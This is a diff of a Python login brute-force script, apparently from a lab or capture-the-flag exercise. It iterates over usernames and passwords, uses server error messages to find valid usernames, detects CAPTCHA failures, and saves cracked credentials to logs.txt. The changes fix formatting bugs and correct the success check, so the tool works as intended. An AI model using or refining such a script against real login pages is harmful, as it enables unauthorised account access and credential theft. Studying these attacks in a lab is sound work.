@@ -38,14 +38,17 @@ for username in usernames:
     ## Step 6: Analyze response
     print("[*] Attempting Password: %s for User: %s" % (password, username))
     if 'does not exist' not in response.text:
-        print("[*]Username: %s is valid", username)
+        print("[*]Username: %s is valid" % username)
 
-        if 'Invalid password' not in response.text:
-            print("[*]Password: %s is correct", password)
-            log = open('logs.txt', 'w')
-            log.write(username +""+ password)
-            exit()
+        if 'Invalid captcha' in response.text:
+           print("[*]Captcha is invalid")
+
+        elif 'Invalid password' in response.text:
+                print("[*]The Password is invalid")
         else:
-            print("[*]The Password is invalid")
+            print("[*]Password: %s is correct" % password)
+            log = open('logs.txt', 'w')
+            log.write(username +" "+ password)
+            exit()
     else:
       break
